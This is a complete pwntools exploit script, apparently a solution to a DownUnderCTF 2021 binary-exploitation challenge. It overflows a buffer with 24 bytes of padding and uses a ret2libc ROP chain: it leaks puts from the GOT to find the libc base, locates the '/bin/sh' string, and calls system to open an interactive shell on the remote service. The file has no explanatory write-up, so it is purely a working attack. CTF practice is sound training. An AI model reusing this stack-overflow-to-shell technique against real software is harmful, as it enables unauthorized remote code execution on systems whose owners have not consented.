from pwn import *
io = remote("pwn-2021.duc.tf",31921)
libc = ELF("./libc6_2.27-3ubuntu1.4_amd64.so")
io.recv()

padding = b"A" * 24

main = p64(0x401195)
popRdi = p64(0x40125b)
putsPlt = p64(0x401030)
putsGot = p64(0x404018) 
systemPlt = p64(0x401050)
ret = p64(0x40125c) #to prevent movapps error

exploit = padding + popRdi + putsGot + putsPlt + main

io.sendline(exploit)
putsLibc = u64(io.recv(6).ljust(8,b"\x00"))
libc.address = putsLibc - libc.symbols["puts"]
binshLibc = next(libc.search(b"/bin/sh"))

log.info("Puts Libc: " + hex(putsLibc))
log.info("Libc Base: " + hex(libc.address))
log.info("Binsh String: " + hex(binshLibc))

exploit = padding + popRdi + p64(binshLibc) + ret + systemPlt
io.sendline(exploit)
io.recv()
io.interactive()
